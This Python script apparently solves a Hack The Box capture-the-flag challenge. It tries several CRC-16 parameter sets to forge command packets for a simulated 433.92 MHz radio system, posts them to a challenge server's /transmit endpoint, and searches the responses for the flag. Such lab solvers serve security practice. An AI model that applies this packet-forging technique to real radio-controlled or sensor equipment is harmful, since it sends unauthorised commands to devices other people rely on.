#!/usr/bin/env python3
import requests
import struct
import time
import re

base_url = 'http://94.237.53.81:59575'

def crc16_variant(data, poly=0x1D0F, init=0x0000, xorout=0x0000):
    crc = init
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc ^ xorout

# INNOVACIÓN: El documento dice initCRC(0x1d0f) - tal vez el INIT es 0x1D0F, no el poly!
print("[*] Probando con INIT=0x1D0F en lugar de POLY=0x1D0F")

init_values = [
    (0x1D0F, 0x1021, 0x0000),  # init=0x1D0F, poly=CCITT, xorout=0
    (0x1D0F, 0x8005, 0x0000),  # init=0x1D0F, poly=IBM, xorout=0
    (0x1D0F, 0x1021, 0xFFFF),  # init=0x1D0F, poly=CCITT, xorout=FFFF
    (0x0000, 0x1D0F, 0xFFFF),  # init=0, poly=0x1D0F, xorout=FFFF
    (0xFFFF, 0x1D0F, 0x0000),  # init=FFFF, poly=0x1D0F, xorout=0
    (0xFFFF, 0x1D0F, 0xFFFF),  # init=FFFF, poly=0x1D0F, xorout=FFFF
]

for init, poly, xorout in init_values:
    print(f"\n[*] Testing init={init:04X}, poly={poly:04X}, xorout={xorout:04X}")
    s = requests.Session()
    s.get(base_url)
    
    # Test packet E1 FF
    data = bytes([0xE1, 0xFF])
    crc = crc16_variant(data, poly=poly, init=init, xorout=xorout)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    print(f"  E1 FF -> {packet}")
    
    # Enviar todos los paquetes
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16_variant(data, poly=poly, init=init, xorout=xorout)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    time.sleep(2)
    r = s.get(base_url)
    if 'HTB{' in r.text:
        print(f"[SUCCESS] Found flag with init={init:04X}, poly={poly:04X}, xorout={xorout:04X}")
        print(re.findall(r'HTB\{[^}]+\}', r.text))
        break
    
    # También verificar updates
    r = s.get(f'{base_url}/updates')
    if 'HTB{' in r.text:
        print(f"[SUCCESS in updates] Found flag with init={init:04X}, poly={poly:04X}, xorout={xorout:04X}")
        print(re.findall(r'HTB\{[^}]+\}', r.text))
        break
    
    # Verificar cambios en sensores
    if 'text-danger' in r.text or 'text-secondary' in r.text or 'text-info' in r.text:
        print(f"  [+] Detected state change!")

print("\n[*] CRC variants test completed")
